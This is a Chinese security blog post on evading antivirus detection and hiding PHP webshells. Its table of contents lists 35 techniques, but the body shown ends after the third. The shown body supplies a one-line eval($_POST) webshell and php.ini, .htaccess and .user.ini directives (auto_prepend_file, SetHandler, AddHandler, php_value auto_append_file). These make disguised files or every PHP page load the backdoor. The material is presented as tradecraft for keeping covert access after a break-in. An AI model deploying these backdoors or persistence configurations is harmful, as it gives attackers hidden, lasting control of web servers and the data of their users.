<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.13.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="本文研究PHP Webshell绕过类型、免杀技术与隐藏思路...">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP Webshell免杀与隐匿研究">
<meta property="og:url" content="https://l0n9w4y.cc/posts/19996/index.html">
<meta property="og:site_name" content="L0n9w4y">
<meta property="og:description" content="本文研究PHP Webshell绕过类型、免杀技术与隐藏思路...">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lcx.cc/file/old/1722_1.png">
<meta property="article:published_time" content="2021-06-11T12:55:12.000Z">
<meta property="article:modified_time" content="2022-09-12T08:59:03.684Z">
<meta property="article:author" content="L0n9w4y">
<meta property="article:tag" content="Webshell">
<meta property="article:tag" content="Malware">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lcx.cc/file/old/1722_1.png">


<link rel="canonical" href="https://l0n9w4y.cc/posts/19996/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/19996/","path":"posts/19996/","title":"PHP Webshell免杀与隐匿研究"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>PHP Webshell免杀与隐匿研究 | L0n9w4y</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">L0n9w4y</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-攻防"><a href="/security/" rel="section"><i class="fa fa-navicon fa-fw"></i>攻防</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Webshell%E5%8E%9F%E7%90%86"><span class="nav-text">0x01 Webshell原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%8F%98%E7%A7%8D"><span class="nav-text">0x02 类型与变种</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-php-ini%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8"><span class="nav-text">1. php.ini隐藏后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-htaccess%E6%96%87%E4%BB%B6PHP%E5%90%8E%E9%97%A8"><span class="nav-text">2. .htaccess文件PHP后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-user-ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8"><span class="nav-text">3. .user.ini文件构成的PHP后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8PHP%E5%8A%A8%E6%80%81%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7"><span class="nav-text">4. 利用PHP动态变量特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-tiny-php-shell"><span class="nav-text">5. tiny php shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E6%97%A0%E5%AD%97%E6%AF%8D-webshell"><span class="nav-text">6. 无字母 webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC"><span class="nav-text">7. 图片木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5-PHP%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="nav-text">8. 字符串拼接+PHP动态函数执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-Curly-Syntax"><span class="nav-text">9. Curly Syntax</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-LFI%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">10. LFI导致的代码执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-PHP%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0-Lamda%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">11. PHP动态创建匿名函数(Lamda表达式)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%BE%93%E5%87%BA%E7%BC%93%E5%AD%98"><span class="nav-text">12. 利用系统输出缓存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-%E5%88%A9%E7%94%A8assert-%E6%96%AD%E8%A8%80"><span class="nav-text">13. 利用assert()断言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-%E6%95%B0%E7%BB%84%E6%98%A0%E5%B0%84%E7%B1%BB%E5%9E%8B%E5%87%BD%E6%95%B0%E5%A4%84%E7%90%86%E5%90%8E%E7%9A%84%E5%9B%9E%E8%B0%83%E6%9C%BA%E5%88%B6"><span class="nav-text">14. 数组映射类型函数处理后的回调机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-PHP%E5%BA%8F%E5%88%97%E5%8C%96-x2F-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%89%B9%E6%80%A7%E5%B8%83%E7%BD%AE%E5%90%8E%E9%97%A8"><span class="nav-text">15. PHP序列化&#x2F;反序列化特性布置后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-%E4%BD%BF%E7%94%A8HTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E8%BF%9B%E8%A1%8C%E6%8C%87%E4%BB%A4%E4%BC%A0%E8%BE%93"><span class="nav-text">16. 使用HTTP头部字段进行指令传输</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-%E4%B9%B1%E5%BA%8F%E6%8B%BC%E6%8E%A5%E6%B3%95"><span class="nav-text">17. 乱序拼接法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#18-PHP%E7%AE%A1%E9%81%93%E6%8A%80%E6%9C%AF%E5%88%A9%E7%94%A8"><span class="nav-text">18. PHP管道技术利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#19-PHP%E6%8C%87%E4%BB%A4%E6%9B%BF%E6%8D%A2"><span class="nav-text">19. PHP指令替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#20-%E5%9F%BA%E4%BA%8E%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E9%9D%9E%E5%8F%AF%E6%98%BE%E7%A4%BA%E5%AD%97%E6%AE%B5%E9%83%A8%E7%BD%B2PHP%E6%9C%A8%E9%A9%AC"><span class="nav-text">20. 基于图片文件非可显示字段部署PHP木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#21-%E6%B3%A8%E9%87%8A-%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="nav-text">21. 注释+反射机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-%E8%87%AA%E6%AF%81%E6%80%A7Webshell"><span class="nav-text">22. 自毁性Webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#23-%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E5%8F%98%E9%87%8F%E6%B3%A8%E5%86%8C%E6%8A%80%E6%9C%AF"><span class="nav-text">23. 利用本地变量注册技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#24-%E5%88%A9%E7%94%A8ReflectionFunction%E5%8F%8D%E5%B0%84"><span class="nav-text">24. 利用ReflectionFunction反射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#25-%E5%88%A9%E7%94%A8PHP%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="nav-text">25. 利用PHP自定义函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#26-%E9%98%B2%E7%AF%A1%E6%94%B9WEBSHELL"><span class="nav-text">26. 防篡改WEBSHELL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#27-%E5%88%A9%E7%94%A8session-set-save-handler-callback"><span class="nav-text">27. 利用session_set_save_handler callback</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#28-%E5%88%A9%E7%94%A8include%E3%80%81pack%E9%9A%90%E8%97%8Fwebshell"><span class="nav-text">28. 利用include、pack隐藏webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#29-%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6-include"><span class="nav-text">29. 临时文件 + include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#30-%E5%88%A9%E7%94%A8filter-var-callback%E7%89%B9%E6%80%A7"><span class="nav-text">30. 利用filter_var callback特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#31-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="nav-text">31. 数据库回调后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#32-%E5%88%A9%E7%94%A8php-memcached%E6%89%A7%E8%A1%8Cwebshell"><span class="nav-text">32. 利用php_memcached执行webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#33-%E5%88%A9%E7%94%A8preg-replace-callback%E9%9A%90%E8%97%8Fwebshell"><span class="nav-text">33. 利用preg_replace_callback隐藏webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#34-%E5%88%A9%E7%94%A8CallbackFilterIterator%E9%83%A8%E7%BD%B2%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="nav-text">34. 利用CallbackFilterIterator部署回调后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#35-PHP%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="nav-text">35. PHP无文件后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="L0n9w4y"
      src="/images/hexo.png">
  <p class="site-author-name" itemprop="name">L0n9w4y</p>
  <div class="site-description" itemprop="description">攻防对抗，問道遠兮，求索未止...</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">27</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/L0n9w4y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0n9w4y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/l0n9w4y" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;l0n9w4y" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/_L0n9_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;_L0n9_" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/19996/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hexo.png">
      <meta itemprop="name" content="L0n9w4y">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L0n9w4y">
      <meta itemprop="description" content="攻防对抗，問道遠兮，求索未止...">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="PHP Webshell免杀与隐匿研究 | L0n9w4y">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          PHP Webshell免杀与隐匿研究
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-06-11 20:55:12" itemprop="dateCreated datePublished" datetime="2021-06-11T20:55:12+08:00">2021-06-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%AF%B9%E6%8A%97/" itemprop="url" rel="index"><span itemprop="name">样本对抗</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <center>本文研究PHP Webshell绕过类型、免杀技术与隐藏思路...</center>

<span id="more"></span>

<h2 id="0x01-Webshell原理"><a href="#0x01-Webshell原理" class="headerlink" title="0x01 Webshell原理"></a>0x01 Webshell原理</h2><p><strong>定义</strong></p>
<p>WebShell是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以称做为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后通过浏览器来访问这些asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载文件，查看数据库，执行任意程序命令等）</p>
<p><strong>组成</strong></p>
<p><img src="https://lcx.cc/file/old/1722_1.png"></p>
<p>结构：数据传递 + 数据执行</p>
<p><strong>变形思路</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. 数据传递:</span><br><span class="line">　　1) $_GET、$_POST、$_COOKIES、$_FILE...(HTTP包中的任何位置都可以作为payload的传输媒介)</span><br><span class="line">　　2) 从远程远程URL中获取数据: file_get_contents、curl、svn_checkout...(将需要执行的指令数据放在远程URL中，通过URL_INCLUDE来读取)</span><br><span class="line">　　3) 从磁盘文件中获取数据: file、file_get_contents...(将需要执行的指令数据放在磁盘文件中，利用IO函数来读取)</span><br><span class="line">　　4) 从数据库中读取(将需要执行的指令放在数据库中，利用数据库函数来读取)</span><br><span class="line">　　5) 从图片头部中获取: exif_read_data...(将需要执行的指令数据放在图片头部中，利用图片操作函数来读取)</span><br><span class="line"></span><br><span class="line">2. 代码执行(执行用户传输的数据)</span><br><span class="line">　　1) eva、system...l执行(这是最普通、标准的代码执行)</span><br><span class="line">　　2) LFI: include、require...(利用浏览器的伪协议将文件包含转化为代码执行)</span><br><span class="line">　　3) 动态函数执行($()...PHP的动态函数特性)</span><br><span class="line">　　4) Curly Syntax($&#123;$&#123;...&#125;&#125;...把变量赋值的漏洞转化为代码执行)</span><br></pre></td></tr></table></figure>

<h2 id="0x02-类型与变种"><a href="#0x02-类型与变种" class="headerlink" title="0x02 类型与变种"></a>0x02 类型与变种</h2><h3 id="1-php-ini隐藏后门"><a href="#1-php-ini隐藏后门" class="headerlink" title="1. php.ini隐藏后门"></a>1. php.ini隐藏后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在php.ini 中添加:</span><br><span class="line"></span><br><span class="line">auto_prepend_file = webshell.php</span><br><span class="line">; (auto_prepend_file是在任意PHP脚本的头部)</span><br><span class="line">; (auto_append_file是在任意PHP脚本的尾部)</span><br><span class="line">; (不管头部还是尾部，webshell都能被正常执行)</span><br><span class="line"></span><br><span class="line">include_path = &quot;/usr/share/www/shell;.&quot;</span><br><span class="line">;我们所要include的文件目录放在根目录的前边。不然的话apache会在根目录下搜索我们的后门(当然是没有了从而导致服务器解析php文件失败)</span><br><span class="line"></span><br><span class="line">在&quot;/usr/share/www/shell&quot;中创建 webshell.php: &lt;?php eval($_POST[1]); ?&gt;</span><br><span class="line">这样可以将webshell藏在磁盘上的任意位置，不一定是要web目录，然后在整个服务器运行期间放置后门</span><br></pre></td></tr></table></figure>

<p>这种利用php.ini的webshell部署攻击方式，一般来说，只有黑客具有了远程修改文件或者已经拿到了目标主机的权限，为了之后的隐蔽访问，而采取的在php.ini中部署一个”后门”，这种webshell部署更倾向于隐藏后门</p>
<h3 id="2-htaccess文件PHP后门"><a href="#2-htaccess文件PHP后门" class="headerlink" title="2. .htaccess文件PHP后门"></a>2. .htaccess文件PHP后门</h3><p>.htaccess是apache的分布式配置文件，提供了针对不同WEB应用对应的子目录改变配置的方法，.htaccess中的指令可以对httpd.conf进行覆盖，前提是httpd.conf中开启了允许覆盖的开关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure>

<p><strong>.htaccess指令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1. AddHandler</span><br><span class="line">    1) Description: Maps the filename extensions to the specified handler</span><br><span class="line">    2) Syntax: AddHandler handler-name extension [extension] ...</span><br><span class="line">    3) Context: server config, virtual host, directory, .htaccess</span><br><span class="line">    4) Override: FileInfo</span><br><span class="line">    5) Status: Base</span><br><span class="line">    6) Module: mod_mime</span><br><span class="line"></span><br><span class="line">refer: http://httpd.apache.org/docs/2.2/mod/mod_mime.html#addhandler</span><br><span class="line">example: AddHandler php5-script .logs  //对.logs的后缀文件解析映射到PHP脚本解析器上</span><br><span class="line"></span><br><span class="line">2. AddType</span><br><span class="line">    1) Description:    Maps the given filename extensions onto the specified content type</span><br><span class="line">    2) Syntax: AddType MIME-type extension [extension] ...</span><br><span class="line">    3) Context: server config, virtual host, directory, .htaccess</span><br><span class="line">    4) Override: FileInfo</span><br><span class="line">    5) Status: Base</span><br><span class="line">    6) Module: mod_mime</span><br><span class="line"></span><br><span class="line">refer: http://httpd.apache.org/docs/2.2/mod/mod_mime.html#addhandler</span><br><span class="line">example: AddType text/html .logs  //指定了.logs的后缀的文件的文件扩展类型为&quot;text/html&quot;，决定了PHP解析这个文件的方式</span><br><span class="line"></span><br><span class="line">3. SetHandler</span><br><span class="line">    1) Description:    Forces all matching files to be processed by a handler</span><br><span class="line">    2) Syntax: SetHandler handler-name|None</span><br><span class="line">    3) Context: server config, virtual host, directory, .htaccess</span><br><span class="line">    4) Override: FileInfo</span><br><span class="line">    5) Status: Core</span><br><span class="line">    6) Module: core</span><br><span class="line">    7) Compatibility: Moved into the core in Apache 2.0</span><br><span class="line"></span><br><span class="line">refer: http://httpd.apache.org/docs/2.2/mod/core.html#sethandler</span><br><span class="line">example: SetHandler application/x-httpd-php  //将所有脚本请求都强制指定为使用&quot;application/x-httpd-php&quot;进行解析</span><br></pre></td></tr></table></figure>

<p><strong>隐藏方式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1）SetHandler</span><br><span class="line">  a. 可将php代码存于非php后缀文件，例: x.png</span><br><span class="line">  b. 将以下代码写入.htaccess中</span><br><span class="line">     SetHandler application/x-httpd-php</span><br><span class="line">  c. 连接x.png即可启动后门木马</span><br><span class="line"></span><br><span class="line">2）AddHandler、AddType</span><br><span class="line">  a. 可将php代码存于非php后缀文件，例: x.log</span><br><span class="line">  b. 将以下代码写入.htaccess中</span><br><span class="line">     AddHandler php5-script .log</span><br><span class="line">     AddType text/html .log</span><br><span class="line">  c. 连接x.log，此时x.log会被apache当成PHP脚本进行解析</span><br><span class="line"></span><br><span class="line">3) php_value</span><br><span class="line">  将以下代码写入.htaccess中, 文件路径必须是绝对路径，访问网站上任何php文件都会启动该php后门木马</span><br><span class="line">  php_value auto_append_file /usr/share/www/webshell.php</span><br></pre></td></tr></table></figure>

<h3 id="3-user-ini文件构成的PHP后门"><a href="#3-user-ini文件构成的PHP后门" class="headerlink" title="3. .user.ini文件构成的PHP后门"></a>3. .user.ini文件构成的PHP后门</h3><p>.user.ini是php应用的分布式配置文件，与.htaccess的利用思想类似，.user.ini也利用分布式的自定义配置文件、从而进行”配置覆盖、劫持”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. 自PHP 5.3.0起，PHP支持基于每个目录的&quot;.htaccess风格&quot;的&quot;INI文件&quot;。此类文件仅被CGI/FastCGI SAPI处理。此功能使得PECL的 htscanner扩展作废。如果使用Apache，则用.htaccess 文件有同样效果 </span><br><span class="line"></span><br><span class="line">2. 除了主php.ini之外，PHP还会在每个目录下扫描INI文件，从被执行的PHP文件所在目录开始一直上升到web根目录($_SERVER[&#x27;DOCUMENT_ROOT&#x27;] 所指定的)。如果被执行的PHP文件在web根目录之外，则只扫描该目录。</span><br><span class="line"></span><br><span class="line">3. 在.user.ini风格的INI文件中只有具有</span><br><span class="line">    1) PHP_INI_PERDIR</span><br><span class="line">    2) PHP_INI_USER</span><br><span class="line">模式的INI设置可被识别 </span><br><span class="line"></span><br><span class="line">4. 两个新的INI指令</span><br><span class="line">    1) user_ini.filename</span><br><span class="line">    2) user_ini.cache_ttl</span><br><span class="line">控制着用户INI文件的使用 </span><br><span class="line"></span><br><span class="line">5. user_ini.filename设定了PHP会在每个目录下搜寻的文件名</span><br><span class="line">    1) 如果设定为空字符串则PHP不会搜寻</span><br><span class="line">    2) 默认值是: .user.ini </span><br><span class="line"></span><br><span class="line">6. user_ini.cache_ttl控制着重新读取用户INI文件的间隔时间</span><br><span class="line">    默认是300秒</span><br></pre></td></tr></table></figure>

<p>在.user.ini风格的INI文件中只有具有”PHP_INI_PERDIR”和”PHP_INI_USER”模式的INI设置可被识别，由此可以知道，”.user.ini”实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为”PHP_INI_PERDIR、PHP_INI_USER”的设置</p>
<p>与php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间(默认为300秒)，即可被重新加载</p>
